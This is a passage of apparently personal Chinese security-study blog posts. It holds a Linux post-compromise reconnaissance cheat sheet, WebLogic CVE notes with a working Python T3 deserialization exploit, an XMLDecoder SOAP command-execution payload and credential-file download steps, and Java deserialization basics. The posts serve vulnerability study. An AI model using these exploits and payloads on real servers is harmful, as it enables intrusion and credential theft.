class="built_in">users</span> <span class="built_in">who</span> -a /var/log/utmp</span><br><span class="line">查询无密码用户 grep <span class="string">&#x27;x:0:&#x27;</span> /etc/passwd</span><br><span class="line">目前登录的用户 w</span><br><span class="line">登入过的用户信息 last / /var/log/wtmp</span><br><span class="line">显示系统中所有用户最近一次登录信息 lastlog / /var/log/lastlog</span><br><span class="line">登录成功日志 /var/log/secure</span><br><span class="line">登录失败日志 /var/log/faillog</span><br><span class="line">查看特权用户 grep :0 /etc/passwd</span><br><span class="line">查看passwd最后修改时间 <span class="built_in">ls</span> -l /etc/passwd</span><br><span class="line">查看是否存在空口令用户 awk -F: <span class="string">&#x27;length($2)==0 &#123;print $1&#125;&#x27;</span> /etc/shadow</span><br><span class="line">查看远程登录的账号 awk <span class="string">&#x27;/\$1|\$6/&#123;print $1&#125;&#x27;</span> /etc/shadow</span><br><span class="line">查看具有sudo权限的用户</span><br><span class="line"><span class="built_in">cat</span> /etc/sudoers | grep -v <span class="string">&quot;^#\|^$&quot;</span> | grep <span class="string">&quot;ALL=(ALL)&quot;</span></span><br><span class="line">6.2.1.3. 用户和权限信息</span><br><span class="line">当前用户 <span class="built_in">whoami</span></span><br><span class="line">当前用户信息 <span class="built_in">id</span></span><br><span class="line">可以使用sudo提升到root的用户（root） <span class="built_in">cat</span> /etc/sudoers</span><br><span class="line">列出目前用户可执行与无法执行的指令 sudo -l</span><br><span class="line">6.2.1.4. 环境信息</span><br><span class="line">打印系统环境信息 <span class="built_in">env</span></span><br><span class="line">打印系统环境信息 <span class="built_in">set</span></span><br><span class="line">环境变量中的路径信息 <span class="built_in">echo</span>  <span class="variable">$PATH</span></span><br><span class="line">打印历史命令 <span class="built_in">history</span> / ~/.bash_history</span><br><span class="line">显示当前路径 <span class="built_in">pwd</span></span><br><span class="line">显示默认系统遍历 <span class="built_in">cat</span> /etc/profile</span><br><span class="line">显示可用的shell <span class="built_in">cat</span> /etc/shells</span><br><span class="line">6.2.1.5. 进程信息</span><br><span class="line">查看进程信息 ps aux</span><br><span class="line">资源占有情况 top -c</span><br><span class="line">查看进程关联文件 lsof -c <span class="variable">$PID</span></span><br><span class="line">完整命令行信息 /proc/<span class="variable">$PID</span>/cmdline</span><br><span class="line">进程的命令名 /proc/<span class="variable">$PID</span>/comm</span><br><span class="line">进程当前工作目录的符号链接 /proc/<span class="variable">$PID</span>/cwd</span><br><span class="line">运行程序的符号链接 /proc/<span class="variable">$PID</span>/exe</span><br><span class="line">进程的环境变量 /proc/<span class="variable">$PID</span>/environ</span><br><span class="line">进程打开文件的情况 /proc/<span class="variable">$PID</span>/fd</span><br><span class="line">6.2.1.6. 服务信息</span><br><span class="line">由inetd管理的服务列表 <span class="built_in">cat</span> /etc/inetd.conf</span><br><span class="line">由xinetd管理的服务列表 <span class="built_in">cat</span> /etc/xinetd.conf</span><br><span class="line">nfs服务器的配置 <span class="built_in">cat</span> /etc/exports</span><br><span class="line">邮件信息 /var/log/mailog</span><br><span class="line">ssh配置 sshd_config</span><br><span class="line">6.2.1.7. 计划任务</span><br><span class="line">显示指定用户的计划作业（root） crontab -l -u %user%</span><br><span class="line">计划任务</span><br><span class="line">/var/spool/cron/*</span><br><span class="line">/var/spool/anacron/*</span><br><span class="line">/etc/crontab</span><br><span class="line">/etc/anacrontab</span><br><span class="line">/etc/cron.*</span><br><span class="line">/etc/anacrontab</span><br><span class="line">开机启动项</span><br><span class="line">/etc/rc.d/init.d/</span><br><span class="line">6.2.1.8. 网络、路由和通信</span><br><span class="line">列出网络接口信息 /sbin/ifconfig -a / ip addr show</span><br><span class="line">列出网络接口信息 <span class="built_in">cat</span> /etc/network/interfaces</span><br><span class="line">查看系统arp表 arp -a</span><br><span class="line">打印路由信息 route / ip ro show</span><br><span class="line">查看dns配置信息 <span class="built_in">cat</span> /etc/resolv.conf</span><br><span class="line">打印本地端口开放信息 netstat -an</span><br><span class="line">列出iptable的配置规则 iptables -L</span><br><span class="line">查看端口服务映射 <span class="built_in">cat</span> /etc/services</span><br><span class="line">Hostname hostname -f</span><br><span class="line">查看进程端口情况 netstat -anltp | grep <span class="variable">$PID</span></span><br><span class="line">6.2.1.9. 已安装程序</span><br><span class="line">rpm -qa --last Redhat</span><br><span class="line">yum list | grep installed CentOS</span><br><span class="line"><span class="built_in">ls</span> -l /etc/yum.repos.d/</span><br><span class="line">dpkg -l Debian</span><br><span class="line"><span class="built_in">cat</span> /etc/apt/sources.list Debian APT</span><br><span class="line">pkg_info xBSD</span><br><span class="line">pkginfo Solaris</span><br><span class="line">pacman -Q Arch Linux</span><br><span class="line">emerge Gentoo</span><br><span class="line">6.2.1.10. 文件</span><br><span class="line">最近五天的文件 find / -ctime +1 -ctime -5</span><br><span class="line">文件系统细节 debugfs</span><br><span class="line">6.2.1.11. 公私钥信息</span><br><span class="line">~/.ssh</span><br><span class="line">/etc/ssh</span><br><span class="line">6.2.1.12. 日志</span><br><span class="line">/var/log/boot.log</span><br><span class="line">/var/log/cron</span><br><span class="line">/var/log/faillog</span><br><span class="line">/var/log/lastlog</span><br><span class="line">/var/log/messages</span><br><span class="line">/var/log/secure</span><br><span class="line">/var/log/syslog</span><br><span class="line">/var/log/syslog</span><br><span class="line">/var/log/wtmp</span><br><span class="line">/var/log/wtmp</span><br><span class="line">/var/run/utmp</span><br><span class="line">6.2.1.13. 虚拟环境检测</span><br><span class="line">lsmod | grep -i <span class="string">&quot;vboxsf\|vboxguest&quot;</span></span><br><span class="line">lsmod | grep -i <span class="string">&quot;vmw_baloon\|vmxnet&quot;</span></span><br><span class="line">lsmod | grep -i <span class="string">&quot;xen-vbd\|xen-vnif&quot;</span></span><br><span class="line">lsmod | grep -i <span class="string">&quot;virtio_pci\|virtio_net&quot;</span></span><br><span class="line">lsmod | grep -i <span class="string">&quot;hv_vmbus\|hv_blkvsc\|hv_netvsc\|hv_utils\|hv_storvsc&quot;</span></span><br><span class="line">6.2.1.14. 容器内信息收集</span><br><span class="line">capsh --<span class="built_in">print</span></span><br><span class="line"><span class="built_in">cat</span> /proc/1/cgroup</span><br><span class="line"><span class="built_in">env</span> | grep KUBE</span><br><span class="line"><span class="built_in">ls</span> -l .dockerenv</span><br><span class="line"><span class="built_in">ls</span> -l /run/secrets/Kubernetes.io/</span><br><span class="line">mount</span><br><span class="line">ps aux</span><br></pre></td></tr></table></figure>



]]></content>
      <tags>
        <tag>配置</tag>
        <tag>命令行</tag>
      </tags>
  </entry>
  <entry>
    <title>weblogic漏洞笔记</title>
    <url>/2023/06/23/weblogic/</url>
    <content><![CDATA[<h1 id="weblogic"><a href="#weblogic" class="headerlink" title="weblogic"></a>weblogic</h1><p>历史漏洞</p>
<h3 id="反序列化"><a href="#反序列化" class="headerlink" title="反序列化"></a>反序列化</h3><h4 id="CVE-2015-4852-amp-CVE-2016-0638（没试）"><a href="#CVE-2015-4852-amp-CVE-2016-0638（没试）" class="headerlink" title="CVE-2015-4852&amp;CVE-2016-0638（没试）"></a>CVE-2015-4852&amp;CVE-2016-0638（没试）</h4><blockquote>
<p>基于weblogic t3 协议引起远程代码执行的反序列化</p>
</blockquote>
<p>RMI通信传输反序列化数据，接收数据后进行反序列化，正常RMI通信使用的是JRMP协议，而在Weblogic的RMI通信中使用的是T3协议。T3协议是Weblogic独有的一个协议，相比于JRMP协议多了一些特性。</p>
<p>t3协议特点</p>
<p>1.心跳包机制，60秒一次，240秒未收到心跳判定与客户端连接丢失</p>
<p>2.建立一次连接可以将全部数据包传输完成，优化了数据包的大小和网络消耗</p>
<p>请求包头</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">t3 12.2.1 AS:255 HL:19 MS:10000000 PU:t3://us-l-breens:7001</span><br></pre></td></tr></table></figure>

<p><img src="https://wangzhi0013-1310260802.cos.ap-nanjing.myqcloud.com/imgimage-20230627021143866.png" alt="image-20230627021143866"></p>
<p>返回的内容中HELO后面有版本号</p>
<p>分析序列化数据看不懂，跳过</p>
<h5 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h5><ol>
<li>将weblogic发送的JAVA序列化数据的第二到九部分的JAVA序列化数据的任意一个替换为恶意的序列化数据。</li>
<li>将weblogic发送的JAVA序列化数据的第一部分与恶意的序列化数据进行拼接。</li>
</ol>
<p>这里可以用jdk7u21和cc1两条链，用创建文件的方式来检验反序列化是否成功</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> os <span class="keyword">import</span> popen</span><br><span class="line"><span class="keyword">import</span> struct <span class="comment"># 负责大小端的转换</span></span><br><span class="line"><span class="keyword">import</span> subprocess</span><br><span class="line"><span class="keyword">from</span> sys <span class="keyword">import</span> stdout</span><br><span class="line"><span class="keyword">import</span> socket</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"><span class="keyword">import</span> binascii</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">generatePayload</span>(<span class="params">gadget,cmd</span>):</span><br><span class="line">    YSO_PATH = <span class="string">&quot;ysoserial.jar&quot;</span></span><br><span class="line">    popen = subprocess.Popen([<span class="string">&#x27;java&#x27;</span>,<span class="string">&#x27;-jar&#x27;</span>,YSO_PATH,gadget,cmd],stdout=subprocess.PIPE)</span><br><span class="line">    <span class="keyword">return</span> popen.stdout.read()</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">T3Exploit</span>(<span class="params">ip,port,payload</span>):</span><br><span class="line">    sock =socket.socket(socket.AF_INET,socket.SOCK_STREAM)</span><br><span class="line">    sock.connect((ip,port))</span><br><span class="line">    handshake = <span class="string">&quot;t3 12.2.3\nAS:255\nHL:19\nMS:10000000\n\n&quot;</span></span><br><span class="line">    sock.sendall(handshake.encode())</span><br><span class="line">    data = sock.recv(<span class="number">1024</span>)</span><br><span class="line">    <span class="built_in">compile</span> = re.<span class="built_in">compile</span>(<span class="string">&quot;HELO:(.*).0.false&quot;</span>)</span><br><span class="line">    <span class="keyword">match</span> = <span class="built_in">compile</span>.findall(data.decode())</span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">match</span>:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;Weblogic: &quot;</span>+<span class="string">&quot;&quot;</span>.join(<span class="keyword">match</span>))</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;Not Weblogic&quot;</span>)</span><br><span class="line">        <span class="comment">#return  </span></span><br><span class="line">    <span class="comment"># 1.占位保证总长度计算正确</span></span><br><span class="line">    header = binascii.a2b_hex(<span class="string">b&quot;00000000&quot;</span>)</span><br><span class="line">    <span class="comment"># 2.固定的T3协议头</span></span><br><span class="line">    t3header = binascii.a2b_hex(<span class="string">b&quot;016501ffffffffffffffff000000690000ea60000000184e1cac5d00dbae7b5fb5f04d7a1678d3b7d14d11bf136d67027973720078720178720278700000000a000000030000000000000006007070707070700000000a000000030000000000000006007006&quot;</span>)</span><br><span class="line">    <span class="comment"># 3.weblogic反序列化数据的标签</span></span><br><span class="line">    desflag = binascii.a2b_hex(<span class="string">b&quot;fe010000&quot;</span>)</span><br><span class="line">    <span class="comment"># 4.跟ysoserial生成的payload拼接起来</span></span><br><span class="line">    payload = header + t3header  +desflag+  payload</span><br><span class="line">    <span class="comment"># 5.计算出长度替换掉用来占位的字符，也就是前四位</span></span><br><span class="line">    payload = struct.pack(<span class="string">&quot;&gt;I&quot;</span>,<span class="built_in">len</span>(payload)) + payload[<span class="number">4</span>:]</span><br><span class="line">    sock.send(payload)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    ip = <span class="string">&quot;192.168.111.132&quot;</span></span><br><span class="line">    port = <span class="number">7001</span></span><br><span class="line">    gadget = <span class="string">&quot;CommonsCollections1&quot;</span></span><br><span class="line">    cmd = <span class="string">&quot;touch /tmp/success&quot;</span></span><br><span class="line">    payload = generatePayload(gadget,cmd)</span><br><span class="line">    T3Exploit(ip,port,payload)</span><br></pre></td></tr></table></figure>

<p>查看容器的&#x2F;tmp目录发现创建了success文件</p>
<p>再回来看看poc，这个poc本质就是把ysoserial生成的payload变成t3协议里的数据格式。</p>
<ul>
<li>数据包长度包括了自身长度和其他三部分数据包长度，所以需要先占位，计算出长度后再替换进去</li>
<li>T3协议头是固定的，直接硬编码进去就行</li>
<li>反序列化标志+数据&#x3D;weblogic反序列化标志<code>fe010000</code>+ysoserial生成的序列化数据</li>
</ul>
<h5 id="修复"><a href="#修复" class="headerlink" title="修复"></a>修复</h5><blockquote>
<p>resolveclass方法的作用是将类的序列化描述符加工成该类的class对象</p>
</blockquote>
<p>​	Weblogic对CVE-2015-4852的修复措施是在resloveClass里加上 ClassFilter.isBlackListed黑名单过滤，黑名单过滤了CommonCollections</p>
<p>​	开放在外网的情况下，可以采用web代理和负载均衡，<strong>web代理</strong>的方式只能转发http请求，而不会转发推协议的请求，<strong>负载均衡</strong>的情况下，可以指定需要负载均衡的协议类型，这里可以设置为http的请求，不接受其他的协议请求转发，这也是在外网见到T3协议漏洞比较少的原因之一</p>
<h4 id="CVE-2016-3510"><a href="#CVE-2016-3510" class="headerlink" title="CVE-2016-3510"></a>CVE-2016-3510</h4><p>基于weblogic t3 协议引起远程代码执行的反序列化</p>
<h4 id="CVE-2017-3248"><a href="#CVE-2017-3248" class="headerlink" title="CVE-2017-3248"></a>CVE-2017-3248</h4><p>基于weblogic t3 协议引起远程代码执行的反序列化，属于weblogic JRMP反序列化</p>
<h4 id="CVE-2018-2628-amp-CVE-2018-2893"><a href="#CVE-2018-2628-amp-CVE-2018-2893" class="headerlink" title="CVE-2018-2628&amp;CVE-2018-2893"></a>CVE-2018-2628&amp;CVE-2018-2893</h4><h5 id="影响版本"><a href="#影响版本" class="headerlink" title="影响版本"></a>影响版本</h5><p>10.3.6.0</p>
<p>12.1.3.0</p>
<p>12.2.1.2</p>
<p>12.2.1.3</p>
<h5 id="复现"><a href="#复现" class="headerlink" title="复现"></a>复现</h5><p>方法一   ： nmap -n -v -p 7001 127.0.0.1 –script weblogic-t3-info</p>
<p><img src="https://wangzhi0013-1310260802.cos.ap-nanjing.myqcloud.com/imgimage-20230625050146188.png" alt="image-20230625050146188"></p>
<p>基于weblogic t3 协议引起远程代码执行的反序列化，属于weblogic JRMP反序列化</p>
<h5 id=""><a href="#" class="headerlink" title=""></a></h5><h4 id="CVE-2023-21839"><a href="#CVE-2023-21839" class="headerlink" title="CVE-2023-21839"></a>CVE-2023-21839</h4><blockquote>
<p>由于Weblogic  t3&#x2F;iiop协议支持远程绑定对象bind到服务端，并且可以通过lookup查看，当远程对象继承自OpaqueReference时，lookup查看远程对象，服务端会调用远程对象getReferent方法。weblogic.deployment.jms.ForeignOpaqueReference继承自OpaqueReference并且实现了getReferent方法，并且存在retVal &#x3D; context.lookup(this.remoteJNDIName)实现，故可以通过rmi&#x2F;ldap远程协议进行远程命令执行</p>
</blockquote>
<p><a href="https://xz.aliyun.com/t/12297">https://xz.aliyun.com/t/12297</a></p>
<h5 id="影响范围"><a href="#影响范围" class="headerlink" title="影响范围"></a>影响范围</h5><ul>
<li>WebLogic_Server &#x3D; 12.2.1.3.0</li>
<li>WebLogic_Server &#x3D; 12.2.1.4.0</li>
<li>WebLogic_Server &#x3D; 14.1.1.0.0</li>
</ul>
<p>poc构造</p>
<p>使用main方法创建了一个getInitialContext方法并使用getInitialContext方法，创建初始上下文并使用T3协议与WebLogic服务器连接，然后创建了一个weblogic.deployment.jms.ForeignOpaqueReference类的实例并通过反射机制访问私有字段以设置远程JNDI名称，并将其绑定到WebLogic服务器上的”bind”命名对象,导致命令执行漏洞。</p>
<h3 id="任意文件上传"><a href="#任意文件上传" class="headerlink" title="任意文件上传"></a>任意文件上传</h3><h4 id="CVE-2018-2894"><a href="#CVE-2018-2894" class="headerlink" title="CVE-2018-2894"></a>CVE-2018-2894</h4><p>访问<a href="http://your-ip:7001/ws_utc/config.do">http://your-ip:7001/ws_utc/config.do</a> ，上传，返回包里有时间戳，一会会作为文件名使用</p>
<p>访问<a href="http://your-ip:7001/ws_utc/css/config/keystore/[%E6%97%B6%E9%97%B4%E6%88%B3]_[%E6%96%87%E4%BB%B6%E5%90%8D]">http://your-ip:7001/ws_utc/css/config/keystore/[时间戳]_[文件名]</a></p>
<h4 id="修复-1"><a href="#修复-1" class="headerlink" title="修复"></a>修复</h4><p>设置config.do页面登陆授权后访问</p>
<p>ips等防御产品可加入相应的特征</p>
<p>升级到官方最新版本</p>
<h3 id="xmldecoder反序列化"><a href="#xmldecoder反序列化" class="headerlink" title="xmldecoder反序列化"></a>xmldecoder反序列化</h3><h4 id="CVE-2017-3506-amp-CVE-2017-10271"><a href="#CVE-2017-3506-amp-CVE-2017-10271" class="headerlink" title="CVE-2017-3506&amp;CVE-2017-10271"></a>CVE-2017-3506&amp;CVE-2017-10271</h4><p>weblogic  wls组件中存在xmldecoder远程代码执行漏洞，可以构造请求对运行的weblogic中间件进行攻击</p>
<h5 id="影响版本-1"><a href="#影响版本-1" class="headerlink" title="影响版本"></a>影响版本</h5><ul>
<li>WebLogic 10.3.6.0</li>
<li>WebLogic 12.1.3.0</li>
<li>WebLogic 12.2.1.0</li>
<li>WebLogic 12.2.1.1</li>
<li>WebLogic 12.2.1.2</li>
</ul>
<h5 id="漏洞地址"><a href="#漏洞地址" class="headerlink" title="漏洞地址"></a>漏洞地址</h5><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">[*] wls-wsat组件路径(url路径)：</span><br><span class="line"></span><br><span class="line">            /wls-wsat/CoordinatorPortType</span><br><span class="line">            /wls-wsat/CoordinatorPortType11</span><br><span class="line">            /wls-wsat/ParticipantPortType</span><br><span class="line">            /wls-wsat/ParticipantPortType11</span><br><span class="line">            /wls-wsat/RegistrationPortTypeRPC</span><br><span class="line">            /wls-wsat/RegistrationPortTypeRPC11</span><br><span class="line">            /wls-wsat/RegistrationRequesterPortType</span><br><span class="line">            /wls-wsat/RegistrationRequesterPortType11</span><br></pre></td></tr></table></figure>

<p>CVE-2017-3506&#96;修补方案为采用黑名单机制禁用了object标签，这简直不要太好绕，所以CVE-2017-10271来了。</p>
<p>绕过就是把object标签改为void标签就行了，因为从代码层面来看，void和object的handler因为是父子类关系，所以逻辑是高度相同的。</p>
<figure class="highlight yaml"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 对weblogic路由  http://<span class="doctag">xxx:</span>7001/wls-wsat/CoordinatorPortType 发送如下数据包</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 修改请求头  content-type: text/xml</span></span><br><span class="line"><span class="comment"># 请求数据为:</span></span><br><span class="line"><span class="string">&lt;soapenv:Envelope</span> <span class="string">xmlns:soapenv=&quot;http://schemas.xmlsoap.org/soap/envelope/&quot;&gt;</span></span><br><span class="line">  <span class="string">&lt;soapenv:Header&gt;</span></span><br><span class="line">    <span class="string">&lt;work:WorkContext</span> <span class="string">xmlns:work=&quot;http://bea.com/2004/06/soap/workarea/&quot;&gt;</span></span><br><span class="line">        <span class="string">&lt;java</span> <span class="string">version=&quot;1.8.0_131&quot;</span> <span class="string">class=&quot;java.beans.XMLDecoder&quot;&gt;</span></span><br><span class="line">          <span class="string">&lt;void</span> <span class="string">class=&quot;java.lang.ProcessBuilder&quot;&gt;</span></span><br><span class="line">            <span class="string">&lt;array</span> <span class="string">class=&quot;java.lang.String&quot;</span> <span class="string">length=&quot;3&quot;&gt;</span></span><br><span class="line">              <span class="string">&lt;void</span> <span class="string">index=&quot;0&quot;&gt;</span></span><br><span class="line">                <span class="string">&lt;string&gt;/bin/bash&lt;/string&gt;</span></span><br><span class="line">              <span class="string">&lt;/void&gt;</span></span><br><span class="line">              <span class="string">&lt;void</span> <span class="string">index=&quot;1&quot;&gt;</span></span><br><span class="line">                <span class="string">&lt;string&gt;-c&lt;/string&gt;</span></span><br><span class="line">              <span class="string">&lt;/void&gt;</span></span><br><span class="line">              <span class="string">&lt;void</span> <span class="string">index=&quot;2&quot;&gt;</span></span><br><span class="line">                <span class="string">&lt;string&gt;ping</span> <span class="number">127.0</span><span class="number">.0</span><span class="number">.1</span><span class="string">&lt;/string&gt;</span></span><br><span class="line">              <span class="string">&lt;/void&gt;</span></span><br><span class="line">            <span class="string">&lt;/array&gt;</span></span><br><span class="line">          <span class="string">&lt;void</span> <span class="string">method=&quot;start&quot;/&gt;&lt;/void&gt;</span></span><br><span class="line">        <span class="string">&lt;/java&gt;</span></span><br><span class="line">      <span class="string">&lt;/work:WorkContext&gt;</span></span><br><span class="line">    <span class="string">&lt;/soapenv:Header&gt;</span></span><br><span class="line">  <span class="string">&lt;soapenv:Body/&gt;</span></span><br><span class="line"><span class="string">&lt;/soapenv:Envelope&gt;</span></span><br></pre></td></tr></table></figure>

<p>需要修改java版本，调用类，0，1，2的参数</p>
<p>CVE-2017-10271的补丁则是继续把黑名单补全，可见除了object，还有method，new，array等标签都被做了处理。 object，new，method标签直接被ban，void属性只能设置index，array的class只能设置为byte类型。</p>
<p>使用class标签构造类，但是由于限制了method函数，无法进行函数调用，只能从构造方法下手，且参数为基本类型：</p>
<ul>
<li>构造函数有写文件操作，文件名和内容可控，可以进行getshell。</li>
<li>构造函数有其他的反序列化操作，我们可以进行二次反序列化操作。</li>
<li>构造函数直接有执行命令的操作，执行命令可控。</li>
<li>有其它的可能导致rce的操作，比如表达式注入之类的。</li>
</ul>
<p>目前存在的利用链有：</p>
<ul>
<li>FileSystemXmlApplicationContext-RCE</li>
<li>UnitOfWorkChangeSet-RCE</li>
<li>ysoserial-jdk7u21-RCE</li>
<li>JtaTransactionManager-JNDI注入</li>
</ul>
<h3 id="任意文件下载"><a href="#任意文件下载" class="headerlink" title="任意文件下载"></a>任意文件下载</h3><p><a href="http://127.0.0.1:7001/hello/file.jsp?path=">http://127.0.0.1:7001/hello/file.jsp?path=</a></p>
<p>读取后台用户密码</p>
<p>weblogic密码使用AES加密，只需要找到用户的密文和加密是的密钥</p>
<p>这两个文件均位于base_domain下，名为serializedSystemIni.dat和config.xml</p>
<p>在本环境中为.&#x2F;security&#x2F;serializedSystemIni.dat和.&#x2F;config&#x2F;config&#x2F;xml</p>
<h3 id="SSRF"><a href="#SSRF" class="headerlink" title="SSRF"></a>SSRF</h3><h4 id="cve-2014-4210"><a href="#cve-2014-4210" class="headerlink" title="cve-2014-4210"></a>cve-2014-4210</h4><h5 id="影响范围-1"><a href="#影响范围-1" class="headerlink" title="影响范围"></a>影响范围</h5><p>10.0.2</p>
<p>10.3.6</p>
<h5 id="漏洞地址-1"><a href="#漏洞地址-1" class="headerlink" title="漏洞地址"></a>漏洞地址</h5><p><a href="http://ip:7001/uddiexplorer/SearchPublicRegistries.jsp">http://ip:7001/uddiexplorer/SearchPublicRegistries.jsp</a></p>
<p>提交的时候 operator参数可控，存在ssrf</p>
<p><img src="https://wangzhi0013-1310260802.cos.ap-nanjing.myqcloud.com/imgimage-20230625043902969.png" alt="image-20230625043902969"></p>
<p><img src="https://wangzhi0013-1310260802.cos.ap-nanjing.myqcloud.com/imgimage-20230625045221646.png" alt="image-20230625045221646"></p>
]]></content>
      <tags>
        <tag>网络安全</tag>
        <tag>漏洞</tag>
      </tags>
  </entry>
  <entry>
    <title>java反序列化</title>
    <url>/2023/06/20/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/</url>
    <content><![CDATA[<p>漏洞介绍</p>
<p>序列化就是把对象转换成字节流，便于保存在内存、文件、数据库中;反序列化即逆过程，由字节流还原成对象。</p>
<p>Java中的ObjectOutputStream类的writeObject()方法可以实现序列化，类ObjectlnputStream类的readobject()方法用于反序列化。</p>
<h3 id="基础知识"><a href="#基础知识" class="headerlink" title="基础知识"></a>基础知识</h3><p>反序列化入门</p>
<p><a href="https://blog.csdn.net/weixin_45808483/article/details/122545168">https://blog.csdn.net/weixin_45808483/article/details/122545168</a></p>
<p><a href="https://www.bilibili.com/video/BV16h411z7o9/?spm_id_from=333.788.video.desc.click&vd_source=46ee6094905cc129c486ece81308d827">https://www.bilibili.com/video/BV16h411z7o9/?spm_id_from=333.788.video.desc.click&amp;vd_source=46ee6094905cc129c486ece81308d827</a></p>
<p>被transient修饰过的变量不能被序列化，因为serialization是吧对象的状态存储到硬盘上，而有些敏感信息，例如银行卡号，是不希望在网络上传输的，transient的作用就是，吧这个变量的生命周期只存在内存中，而不会写到磁盘持久化</p>
<p><strong>Externalizable</strong>接口</p>
<p>需要重写writeExternal和readExternal方法，它的效率比Serializable高一些，并且可以决定哪些属性需要序列化（即使是transient修饰的），但是对大量对象，或者重复对象，则效率低</p>
<p>java中自带序列化的类 ， map    hashmap   ，hashmap是重写writeobject和readobject方法的，</p>
<blockquote>
<p>序列化是为了让序列化之前和反序列化之后的数据一样，hashmap中，entry的存放位置是key的hash值来计算，然后存放到数组中的，对于同一个key，在不同的jvm中计算出来的hash值可能是不同的，所以需要hashmap重写writeobject和readobject方法</p>
</blockquote>
<p>yeoserial构造复杂反序列化链</p>
<p><a href="https://www.bilibili.com/video/BV115411K7MX/?spm_id_from=333.337.search-card.all.click&vd_source=46ee6094905cc129c486ece81308d827">https://www.bilibili.com/video/BV115411K7MX/?spm_id_from=333.337.search-card.all.click&amp;vd_source=46ee6094905cc129c486ece81308d827</a></p>
<p><strong>javaEE的核心技术</strong>有：JDBC、JNDI、RMI、EJB、Servlet、JSP、XML、JMS、Java IDL、JTS、JTA、JavaMail 和 JAF</p>
<p><strong>MVC</strong>的工作流程：Controller 层接收用户的请求，并决定应该调用哪个 Model 来进行处理；然后，由 Model 使用逻辑处理用户的请求并返回数<br>据；最后，返回的数据通过 View 层呈现给用户</p>
<h4 id="动态代理"><a href="#动态代理" class="headerlink" title="动态代理"></a><strong>动态代理</strong></h4><blockquote>
<p>通过动态代理可以实现多个需求，</p>
<p>静态代理不易于项目维护，会造成冗余，</p>
</blockquote>
<p>动态代理是通过实现接口的方式来实现代理，通过proxy类创建代理对象，然后将接口方法’代理‘给InvocationHandler接口完成的（实现InvocationHandler需要重写	invoke方法）</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">interface</span> <span class="title class_">IUser</span> &#123;</span><br><span class="line">    <span class="keyword">void</span> <span class="title function_">show</span><span class="params">()</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">UserImpl</span> <span class="keyword">implements</span> <span class="title class_">IUser</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">UserImpl</span><span class="params">()</span> &#123;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">show</span><span class="params">()</span> &#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;展示&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">UserInvocationHandler</span> <span class="keyword">implements</span> <span class="title class_">InvocationHandler</span> &#123;</span><br><span class="line">    IUser user;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">UserInvocationHandler</span><span class="params">(IUser user)</span> &#123;</span><br><span class="line">        <span class="built_in">this</span>.user = user;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">UserInvocationHandler</span><span class="params">()</span> &#123;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> Object <span class="title function_">invoke</span><span class="params">(Object proxy, Method method, Object[] args)</span> <span class="keyword">throws</span> Throwable &#123;</span><br><span class="line">        method.invoke(user, args);</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">proxy</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line"></span><br><span class="line">        <span class="type">IUser</span> <span class="variable">user</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">UserImpl</span>();</span><br><span class="line"></span><br><span class="line">        <span class="type">UserInvocationHandler</span> <span class="variable">userInvocationHandler</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">UserInvocationHandler</span>(user);</span><br><span class="line">        <span class="type">IUser</span> <span class="variable">userProxy</span> <span class="operator">=</span> (IUser) Proxy.newProxyInstance(user.getClass().getClassLoader(), user.getClass().getInterfaces(), userInvocationHandler);</span><br><span class="line">        userProxy.show();</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>





<p><strong>CGLib</strong></p>
<blockquote>
<p>动态代理基于反射机制实现的，必须实现接口的业务类才能使用这种办法生成代理对象，只能基于接口设计，对于没有接口的情况，JDK方式无法解决，而CGLib采用非常底层的字节码技术，性能也表现不错</p>
</blockquote>
<p>一个第三方代码生成类库，基于asm机制实现的，通过实现生成业务类的子类作为代理类</p>
<p><strong>javassist动态编程</strong></p>
<p>静态编程的类型检查是在编译时完成的，对于动态编程来说，类型检查是在运行时完成的 ，因此所谓的动态编程就是绕过编译过程在运行时进行操作的技术</p>
<h4 id="类加载"><a href="#类加载" class="headerlink" title="类加载"></a>类加载</h4><p>类加载会执行代码</p>
<p>初始化：静态代码块</p>
<p>实例化：构造代码块，无参构造函数</p>
